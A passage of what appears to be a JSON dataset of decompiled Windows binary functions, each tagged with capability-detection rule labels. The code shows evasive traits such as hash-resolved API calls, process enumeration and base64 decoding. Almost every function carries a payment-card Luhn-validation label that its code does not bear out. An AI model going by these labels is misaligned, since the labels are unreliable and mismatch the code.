uVar2 = fcn.0040a235();\n                puVar4[1] = uVar2;\n                fcn.0040a3fe();\n                uVar2 = fcn.0040a235();\n                puVar4[2] = uVar2;\n                fcn.0040a3fe();\n                *0x42e410 = puVar4;\n            }\n            var_24h = 1;\n        }\n        fcn.0040a262(&var_2ch);\n        fcn.0040a262(&var_4h);\n        fcn.0040a262(&var_8h);\n        fcn.0040a262(&var_10h);\n        fcn.0040a262(&var_14h);\n        fcn.0040a262(&var_18h);\n        fcn.0040a262(&var_1ch);\n        fcn.0040a262(&var_20h);\n        fcn.0040a262(&var_30h);\n        fcn.0040a262(&var_34h);\n        fcn.0040a262(&var_38h);\n        fcn.0040a262(&var_ch);\n        fcn.0040a262(&var_3ch);\n        fcn.0040a262(&var_40h);\n        fcn.0040a262(&var_44h);\n        return var_24h;\n    }\n    return 0;\n}\n",
        "token_count": 1175
    },
    "00408672": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00408672(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar3 = 0x8000;\n    while( true ) {\n        iVar1 = fcn.00406338(0);\n        if (iVar1 == 0) {\n            return 0;\n        }\n        iVar2 = (*_sym.imp.ntdll.dll_ZwQuerySystemInformation)(5, iVar1, iVar3, 0);\n        if (iVar2 != -0x3ffffffc) break;\n        fcn.00406445();\n        iVar3 = iVar3 * 2;\n    }\n    if (-1 < iVar2) {\n        return iVar1;\n    }\n    fcn.00406445();\n    return 0;\n}\n",
        "token_count": 174
    },
    "004086b5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004086b5(uint param_1, uint param_2)\n\n{\n    char cVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    \n    cVar1 = fcn.00409ec6(param_1);\n    if ((cVar1 != '\\0') && (piVar2 = fcn.00408672(),  piVar2 != NULL)) {\n        while( true ) {\n            iVar3 = (*_sym.imp.KERNEL32.dll_lstrcmpiW)(param_1, piVar2[0xf]);\n            if (iVar3 == 0) {\n                fcn.00408635(piVar2[0x11], param_2);\n            }\n            if (*piVar2 == 0) break;\n            piVar2 = piVar2 + *piVar2;\n        }\n        fcn.00406445();\n    }\n    return;\n}\n",
        "token_count": 197
    },
    "004087aa": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004087aa(uint arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint var_58h;\n    uint var_49h;\n    uint lpBuffer;\n    uint nSize;\n    uint var_4h;\n    \n    cVar1 = fcn.00409f19(arg_8h);\n    if ((cVar1 == '\\0') || (cVar1 = fcn.00409e9f(arg_ch, 0x28),  cVar1 == '\\0')) {\n        iVar2 = 0;\n    }\n    else {\n        iVar2 = 0;\n        nSize = 0x10;\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetComputerNameA)(&lpBuffer, &nSize);\n        if (iVar3 != 0) {\n            uVar4 = fcn.00405e30(0x4126fc, 5, 0x2fd93b9b, 0);\n            iVar3 = fcn.00409488(uVar4, &lpBuffer);\n            if (iVar3 != 0) {\n                iVar2 = fcn.0040a7ed(var_4h, &var_58h);\n                if (iVar2 != 0) {\n                    uVar4 = fcn.00405e30(0x412704, 0x32, 0x38a983c4, 0);\n                    fcn.004093eb(arg_ch, uVar4, var_58h);\n                }\n                fcn.00406445();\n            }\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 374
    },
    "0040889b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040889b(uint arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint var_68h;\n    \n    cVar1 = fcn.00409ec6(arg_8h);\n    if ((cVar1 == '\\0') || (cVar1 = fcn.00409e9f(arg_ch, 0x50),  cVar1 == '\\0')) {\n        uVar2 = 0;\n    }\n    else {\n        uVar2 = 0;\n        iVar3 = fcn.00408db6(arg_8h);\n        if (iVar3 != 0) {\n            uVar2 = fcn.004087aa(iVar3, &var_68h);\n            if (uVar2 != 0) {\n                iVar3 = fcn.00408e40(&var_68h, 0, arg_ch);\n                uVar2 = iVar3 != 0;\n            }\n            fcn.00406445();\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 245
    },
    "00408a74": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00408a74(uint32_t param_1)\n\n{\n    uint32_t in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    \n    if (param_1 != in_EAX) {\n        uVar3 = in_EAX;\n        uVar2 = param_1;\n        if (in_EAX < param_1) {\n            uVar3 = param_1;\n            uVar2 = in_EAX;\n        }\n        do {\n            iVar1 = fcn.00408a11();\n            param_1 = iVar1 + uVar2;\n        } while (uVar3 < param_1);\n    }\n    return param_1;\n}\n",
        "token_count": 163
    },
    "00408aa1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: pbBinary\n// WARNING: Variable defined which should be unmapped: var_1ch\n\nvoid __cdecl fcn.00408aa1(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    uint uVar2;\n    int32_t iVar3;\n    char *extraout_ECX;\n    int32_t unaff_EBP;\n    uint32_t uVar4;\n    char *pcVar5;\n    uint pszString;\n    uint var_34h;\n    uint pszSet;\n    uint pcbBinary;\n    uint var_28h;\n    uint var_24h;\n    uint pbBinary;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.0040fe60(0x4129e0, 0x74);\n    *(unaff_EBP + -0x28) = 0;\n    *(unaff_EBP + -4) = 0;\n    uVar2 = (*_sym.imp.KERNEL32.dll_lstrlenA)(extraout_ECX);\n    *(unaff_EBP + -0x1c) = uVar2;\n    *(unaff_EBP + -0x24) = extraout_ECX;\n    uVar2 = fcn.004061f2(0x412748, 4, 0x65c2998b);\n    *(unaff_EBP + -0x30) = uVar2;\n    *(unaff_EBP + -0x20) = *(unaff_EBP + 8);\n    pcVar5 = extraout_ECX;\n    while (*(unaff_EBP + -0x1c) != 0) {\n        if (*pcVar5 == '-') {\n            uVar2 = fcn.004061f2(0x412750, 2, 0x1a4d2be2);\n            iVar3 = (*_sym.imp.SHLWAPI.dll_StrPBrkA)(pcVar5, uVar2);\n            if (iVar3 == 0) break;\n            iVar3 = iVar3 - pcVar5;\n            pcVar5 = pcVar5 + iVar3;\n            *(unaff_EBP + -0x24) = pcVar5;\n            *(unaff_EBP + -0x1c) = *(unaff_EBP + -0x1c) - iVar3;\n        }\n        *(unaff_EBP + -0x80) = 0;\n        sub.ntdll.dll_memset(unaff_EBP + -0x7f, 0, 0x40);\n        for (uVar4 = 0; (*(unaff_EBP + -0x34) = uVar4,  *(unaff_EBP + -0x1c) != 0 && (uVar4 < 0x40)); uVar4 = uVar4 + 1)\n        {\n            iVar3 = (*_sym.imp.SHLWAPI.dll_StrSpnA)(pcVar5, *(unaff_EBP + -0x30));\n            pcVar5 = pcVar5 + iVar3;\n            *(unaff_EBP + -0x24) = pcVar5;\n            piVar1 = unaff_EBP + -0x1c;\n            *piVar1 = *piVar1 - iVar3;\n            if (*piVar1 == 0) break;\n            *(unaff_EBP + -0x80 + uVar4) = *pcVar5;\n            pcVar5 = pcVar5 + 1;\n            *(unaff_EBP + -0x24) = pcVar5;\n            *(unaff_EBP + -0x1c) = *(unaff_EBP + -0x1c) + -1;\n        }\n        if (uVar4 == 0) break;\n        *(unaff_EBP + -0x2c) = uVar4;\n        iVar3 = (*_sym.imp.CRYPT32.dll_CryptStringToBinaryA)\n                          (unaff_EBP + -0x80, uVar4, 1, *(unaff_EBP + -0x20), unaff_EBP + -0x2c, 0, 0);\n        if (iVar3 == 0) break;\n        *(unaff_EBP + -0x28) = *(unaff_EBP + -0x28) + *(unaff_EBP + -0x2c);\n        if (*(unaff_EBP + -0x20) != 0) {\n            *(unaff_EBP + -0x20) = *(unaff_EBP + -0x20) + *(unaff_EBP + -0x2c);\n        }\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.0040fe9b();\n    return;\n}\n",
        "token_count": 1075
    },
    "00408c74": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00408c74(int32_t pbBinary, int32_t *arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t pszString;\n    uint var_8h;\n    uint pcchString;\n    \n    iVar1 = *0x42e3fc;\n    pszString = 0;\n    if ((pbBinary != 0) && (*0x42e3fc != 0)) {\n        pcchString = 0;\n        (*_sym.imp.CRYPT32.dll_CryptBinaryToStringA)(pbBinary, *0x42e3fc, 1, 0, &pcchString);\n        pszString = fcn.00406338(0);\n        if (pszString != 0) {\n            iVar1 = fcn.00408c16(pbBinary, iVar1, pszString);\n            if (iVar1 == 0) {\n                fcn.00406445();\n                pszString = 0;\n            }\n            else {\n                *(iVar1 + pszString) = 0;\n                if (arg_ch != NULL) {\n                    *arg_ch = iVar1;\n                }\n            }\n        }\n    }\n    return pszString;\n}\n",
        "token_count": 257
    },
    "00408db6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00408e28)\n\nint32_t __cdecl fcn.00408db6(uint lpString)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t arg_10h;\n    uint var_4h;\n    \n    arg_10h = 0;\n    cVar1 = fcn.00409eed(lpString);\n    if (((cVar1 != '\\0') &&\n        (((in_EAX != 0 || (in_EAX = (*_sym.imp.KERNEL32.dll_lstrlenW)(lpString),  in_EAX != 0)) &&\n         (iVar2 = fcn.00408cee(lpString, 0),  iVar2 != 0)))) && (arg_10h = fcn.00406338(0),  arg_10h != 0)) {\n        iVar2 = fcn.00408d65(lpString, in_EAX, arg_10h);\n        if (iVar2 == 0) {\n            fcn.00406445();\n            arg_10h = 0;\n        }\n        else {\n            *(iVar2 + arg_10h) = 0;\n        }\n    }\n    return arg_10h;\n}\n",
        "token_count": 275
    },
    "00408e40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00408e40(uint lpString, uint arg_ch, uint arg_10h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    \n    uVar3 = 0;\n    cVar1 = fcn.00409f19(lpString);\n    if (cVar1 != '\\0') {\n        if (in_EAX == 0) {\n            iVar2 = (*_sym.imp.KERNEL32.dll_lstrlenA)(lpString);\n            in_EAX = iVar2 + 1;\n        }\n        cVar1 = fcn.00409e9f(arg_10h, in_EAX * 2);\n        if (cVar1 != '\\0') {\n            uVar3 = fcn.00408d2d(0x4e3, lpString, in_EAX);\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 205
    },
    "00408e9a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00408f0b)\n\nint32_t __cdecl fcn.00408e9a(uint lpString)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t arg_10h;\n    uint var_4h;\n    \n    arg_10h = 0;\n    cVar1 = fcn.00409f40(lpString);\n    if ((((cVar1 != '\\0') && (iVar2 = (*_sym.imp.KERNEL32.dll_lstrlenA)(lpString),  iVar2 != 0)) &&\n        (iVar3 = fcn.00408d2d(0x4e3, lpString, 0),  iVar3 != 0)) && (arg_10h = fcn.00406338(0),  arg_10h != 0)) {\n        iVar2 = fcn.00408e40(lpString, iVar2, arg_10h);\n        if (iVar2 == 0) {\n            fcn.00406445();\n            arg_10h = 0;\n        }\n        else {\n            *(arg_10h + iVar2 * 2) = 0;\n        }\n    }\n    return arg_10h;\n}\n",
        "token_count": 277
    },
    "00408f25": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00408f25(uint lpString, int32_t arg_ch, int32_t *arg_10h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    cVar1 = fcn.00409f40(lpString);\n    if ((cVar1 != '\\0') &&\n       (((arg_ch != 0 || (iVar2 = (*_sym.imp.KERNEL32.dll_lstrlenA)(lpString),  iVar2 != 0)) &&\n        (iVar2 = fcn.00408d2d(0xfde9, lpString, 0),  iVar2 != 0)))) {\n        var_4h = fcn.00406338(0);\n        if (var_4h != 0) {\n            cVar1 = fcn.00409f19(lpString);\n            if (((cVar1 == '\\0') || (cVar1 = fcn.00409e9f(var_4h, iVar2 * 2),  cVar1 == '\\0')) ||\n               (iVar2 = fcn.00408d2d(0xfde9, lpString, iVar2),  iVar2 == 0)) {\n                fcn.00406445();\n                var_4h = 0;\n            }\n            else {\n                if (arg_10h != NULL) {\n                    *arg_10h = iVar2;\n                }\n                *(var_4h + iVar2 * 2) = 0;\n            }\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 354
    },
    "00409014": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00409014(void)\n\n{\n    char cVar1;\n    uint8_t uVar2;\n    char *in_EAX;\n    int32_t iVar3;\n    uint32_t uVar4;\n    \n    iVar3 = 0;\n    cVar1 = fcn.00409f19();\n    if (cVar1 != '\\0') {\n        if ((*in_EAX == '0') && ((in_EAX[1] == 'x' || (in_EAX[1] == 'X')))) {\n            in_EAX = in_EAX + 2;\n        }\n        uVar4 = 0;\n        do {\n            (*_sym.imp.ntdll.dll_tolower)(*in_EAX);\n            uVar2 = fcn.00408fee();\n            in_EAX = in_EAX + 1;\n            if (uVar2 == 0xff) {\n                return iVar3;\n            }\n            iVar3 = iVar3 * 0x10 + uVar2;\n            uVar4 = uVar4 + 1;\n        } while (uVar4 < 8);\n    }\n    return iVar3;\n}\n",
        "token_count": 247
    },
    "00409349": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00409349(int32_t *arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t iStack12;\n    \n    iStack12 = 0;\n    iVar1 = fcn.0040ba84(0, arg_10h);\n    if (iVar1 != 0) {\n        iVar1 = fcn.004063a5();\n        if (iVar1 != 0) {\n            iStack12 = fcn.0040ba84(iVar1 + arg_ch, arg_10h);\n            if (iStack12 != 0) {\n                iStack12 = iStack12 + arg_ch;\n                *arg_8h = iVar1;\n            }\n        }\n    }\n    return iStack12;\n}\n",
        "token_count": 185
    },
    "00409428": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00409428(uint arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.0040fe60(0x4129b0, 0x10);\n    cVar1 = fcn.00409e9f(extraout_ECX, 4);\n    if (cVar1 != '\\0') {\n        *(unaff_EBP + -0x20) = 0;\n        *(unaff_EBP + -4) = 0;\n        *(unaff_EBP + -0x1c) = 0;\n        iVar2 = fcn.004092f1(unaff_EBP + -0x1c, *(unaff_EBP + 8), unaff_EBP + 0xc);\n        *(unaff_EBP + -0x20) = iVar2;\n        if (iVar2 != 0) {\n            *extraout_ECX = *(unaff_EBP + -0x1c);\n        }\n        *(unaff_EBP + -4) = 0xffffffff;\n    }\n    fcn.0040fe9b();\n    return;\n}\n",
        "token_count": 307
    },
    "00409488": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00409488(uint arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.0040fe60(0x4129a0, 0x10);\n    cVar1 = fcn.00409e9f(extraout_ECX, 4);\n    if (cVar1 != '\\0') {\n        *(unaff_EBP + -0x20) = 0;\n        *(unaff_EBP + -4) = 0;\n        *(unaff_EBP + -0x1c) = 0;\n        iVar2 = fcn.00409349(unaff_EBP + -0x1c, 0, *(unaff_EBP + 8), unaff_EBP + 0xc);\n        *(unaff_EBP + -0x20) = iVar2;\n        if (iVar2 != 0) {\n            *extraout_ECX = *(unaff_EBP + -0x1c);\n        }\n        *(unaff_EBP + -4) = 0xffffffff;\n    }\n    fcn.0040fe9b();\n    return;\n}\n",
        "token_count": 309
    },
    "004094e9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.004094e9(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    char cVar1;\n    uint uVar2;\n    uint *arg_8h_00;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.0040fe60(0x412990, 0xc);\n    cVar1 = fcn.00409e9f(arg_8h_00, 4);\n    if (cVar1 != '\\0') {\n        *(unaff_EBP + -0x1c) = 0;\n        *(unaff_EBP + -4) = 0;\n        if (*(unaff_EBP + 8) == 0) {\n            uVar2 = (*_sym.imp.KERNEL32.dll_lstrlenA)(*arg_8h_00);\n            *(unaff_EBP + 8) = uVar2;\n        }\n        uVar2 = fcn.00409349(arg_8h_00, *(unaff_EBP + 8), *(unaff_EBP + 0xc), unaff_EBP + 0x10);\n        *(unaff_EBP + -0x1c) = uVar2;\n        *(unaff_EBP + -4) = 0xffffffff;\n    }\n    fcn.0040fe9b();\n    return;\n}\n",
        "token_count": 326
    },
    "0040954d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040954d(uint lpString2)\n\n{\n    code *pcVar1;\n    char cVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t *extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.0040fe60(0x412980, 0x10);\n    cVar2 = fcn.00409e9f(extraout_ECX, 4);\n    if (cVar2 != '\\0') {\n        *(unaff_EBP + -0x1c) = 0;\n        *(unaff_EBP + -4) = 0;\n        pcVar1 = _sym.imp.KERNEL32.dll_lstrlenW;\n        iVar3 = (*_sym.imp.KERNEL32.dll_lstrlenW)(*(unaff_EBP + 8));\n        iVar4 = (*pcVar1)(*extraout_ECX);\n        *(unaff_EBP + -0x20) = iVar4;\n        *(unaff_EBP + -0x1c) = iVar4 + iVar3;\n        iVar4 = fcn.004063a5();\n        *extraout_ECX = iVar4;\n        if (iVar4 == 0) {\n            *(unaff_EBP + -0x1c) = 0;\n        }\n        else {\n            (*_sym.imp.KERNEL32.dll_lstrcpynW)(iVar4 + *(unaff_EBP + -0x20) * 2, *(unaff_EBP + 8), iVar3 + 1);\n        }\n        *(unaff_EBP + -4) = 0xffffffff;\n    }\n    fcn.0040fe9b();\n    return;\n}\n",
        "token_count": 409
    },
    "004095cd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.004095cd(uint lpString2)\n\n{\n    code *pcVar1;\n    char cVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t *extraout_ECX;\n    int32_t unaff_EBP;\n    uint lpString1;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.0040fe60(0x412970, 0x10);\n    cVar2 = fcn.00409e9f(extraout_ECX, 4);\n    if (cVar2 != '\\0') {\n        *(unaff_EBP + -0x1c) = 0;\n        *(unaff_EBP + -4) = 0;\n        pcVar1 = _sym.imp.KERNEL32.dll_lstrlenA;\n        iVar3 = (*_sym.imp.KERNEL32.dll_lstrlenA)(*(unaff_EBP + 8));\n        iVar4 = (*pcVar1)(*extraout_ECX);\n        *(unaff_EBP + -0x20) = iVar4;\n        *(unaff_EBP + -0x1c) = iVar4 + iVar3;\n        iVar4 = fcn.004063a5();\n        *extraout_ECX = iVar4;\n        if (iVar4 == 0) {\n            *(unaff_EBP + -0x1c) = 0;\n        }\n        else {\n            (*_sym.imp.KERNEL32.dll_lstrcpynA)(iVar4 + *(unaff_EBP + -0x20), *(unaff_EBP + 8), iVar3 + 1);\n        }\n        *(unaff_EBP + -4) = 0xffffffff;\n    }\n    fcn.0040fe9b();\n    return;\n}\n",
        "token_count": 403
    },
    "004096ec": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004096ec(uint lptstrFilename, uint s1)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint32_t uVar5;\n    uint lplpBuffer;\n    uint32_t puLen;\n    \n    uVar5 = 0;\n    uVar1 = (*_sym.imp.VERSION.dll_GetFileVersionInfoSizeA)(lptstrFilename, 0);\n    uVar2 = uVar1;\n    if (uVar1 != 0) {\n        uVar2 = fcn.00406338(0);\n        if (uVar2 != 0) {\n            iVar3 = (*_sym.imp.VERSION.dll_GetFileVersionInfoA)(lptstrFilename, 0, uVar1, uVar2);\n            if (iVar3 != 0) {\n                uVar4 = fcn.00405e30(0x4127bc, 1, 0xdbbea4fc, 0);\n                iVar3 = (*_sym.imp.VERSION.dll_VerQueryValueA)(uVar2, uVar4, &lplpBuffer, &puLen);\n                if (iVar3 != 0) {\n                    if (0x34 < puLen) {\n                        puLen = 0x34;\n                    }\n                    sub.ntdll.dll_memcpy(s1, lplpBuffer, puLen);\n                    uVar5 = 1;\n                }\n            }\n            uVar2 = fcn.00406445();\n        }\n    }\n    return uVar2 & 0xffffff00 | uVar5;\n}\n",
        "token_count": 354
    },
    "00409a3c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool fcn.00409a3c(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    code *pcVar3;\n    uint extraout_ECX;\n    uint unaff_ESI;\n    bool bVar4;\n    \n    bVar4 = false;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)();\n    iVar2 = fcn.00408708(uVar1);\n    if (iVar2 != 0) {\n        uVar1 = fcn.00405e30(0x4127c0, 0x1e, 0x3021ab68, 0);\n        uVar1 = fcn.00406209(0x412738, 0xc, 0xf85e425a, extraout_ECX, uVar1);\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(uVar1);\n        pcVar3 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n        if (pcVar3 != NULL) {\n            iVar2 = (*pcVar3)(unaff_ESI);\n            bVar4 = iVar2 != 0;\n        }\n    }\n    return bVar4;\n}\n",
        "token_count": 265
    },
    "00409aa1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00409aa1(int16_t *arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int16_t *piVar4;\n    uint uVar5;\n    uint lpPathName;\n    uint lpTempFileName;\n    \n    uVar5 = 0;\n    fcn.00409ec6(0);\n    cVar1 = fcn.00409ec6(arg_8h);\n    if (cVar1 == '\\0') {\n        arg_8h = NULL;\n    }\n    iVar2 = (*_sym.imp.KERNEL32.dll_GetTempPathW)(0x104, &lpPathName);\n    if (iVar2 != 0) {\n        uVar3 = fcn.00406209(0x4127e0, 3, 0xe557df26);\n        iVar2 = (*_sym.imp.KERNEL32.dll_GetTempFileNameW)(&lpPathName, uVar3, 0, &lpTempFileName);\n        if (iVar2 != 0) {\n            fcn.00409bda();\n            if (arg_8h != NULL) {\n                iVar2 = (*_sym.imp.KERNEL32.dll_lstrlenW)(&lpTempFileName);\n                for (piVar4 = &lpTempFileName + iVar2 * 2; *piVar4 != 0x2e; piVar4 = piVar4 + -1) {\n                }\n                if (*arg_8h != 0x2e) {\n                    piVar4 = piVar4 + 1;\n                }\n                (*_sym.imp.KERNEL32.dll_lstrcpyW)(piVar4, arg_8h);\n            }\n            uVar5 = fcn.0040926b(&lpTempFileName);\n        }\n    }\n    return uVar5;\n}\n",
        "token_count": 399
    },
    "00409c6a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool fcn.00409c6a(uint param_1, uint param_2)\n\n{\n    int16_t *in_EAX;\n    int32_t iVar1;\n    \n    if (in_EAX != NULL) {\n        for (; (*in_EAX == 0x5c || (*in_EAX == 0x2f)); in_EAX = in_EAX + 1) {\n        }\n    }\n    iVar1 = (*_sym.imp.SHLWAPI.dll_PathCombineW)(param_1, param_2, in_EAX);\n    return iVar1 != 0;\n}\n",
        "token_count": 127
    },
    "00409dae": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.00409dae(void)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t extraout_ECX;\n    int32_t unaff_EBP;\n    uint dwErrCode;\n    uint var_4h;\n    \n    fcn.0040fe60(0x412910, 0xc);\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n    *(unaff_EBP + -0x1c) = uVar2;\n    *(unaff_EBP + -4) = 0;\n    cVar1 = fcn.00409e9f(extraout_ECX, 0x20);\n    if (cVar1 != '\\0') {\n        cVar1 = fcn.00409cbb(extraout_ECX);\n        if (cVar1 != '\\0') {\n            iVar3 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n            if (*(extraout_ECX + 4) == iVar3) {\n                *(extraout_ECX + 4) = 0;\n            }\n            (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(extraout_ECX + 8);\n        }\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    (*_sym.imp.KERNEL32.dll_SetLastError)(*(unaff_EBP + -0x1c));\n    fcn.0040fe9b();\n    return;\n}\n",
        "token_count": 332
    },
    "0040a29a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040a29a(uint32_t n)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t *unaff_EDI;\n    uint s1;\n    \n    uVar2 = n;\n    if (n < unaff_EDI[1]) {\n        do {\n            *(*unaff_EDI + uVar2 * 4) = 0;\n            uVar2 = uVar2 + 1;\n        } while (uVar2 < unaff_EDI[1]);\n        unaff_EDI[1] = n;\n    }\n    else {\n        uVar2 = unaff_EDI[2];\n        if (uVar2 < n) {\n            iVar3 = fcn.00406338(0);\n            iVar1 = *unaff_EDI;\n            if (iVar3 == 0) {\n                fcn.0040cfc5();\n                fcn.00406445();\n            }\n            sub.ntdll.dll_memcpy(iVar3, iVar1, uVar2 << 2);\n            fcn.0040cfc5();\n            fcn.00406445();\n            *unaff_EDI = iVar3;\n            unaff_EDI[2] = n;\n        }\n        for (uVar2 = unaff_EDI[1]; uVar2 < n; uVar2 = uVar2 + 1) {\n            *(*unaff_EDI + uVar2 * 4) = 0;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 336
    },
    "0040a5cd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
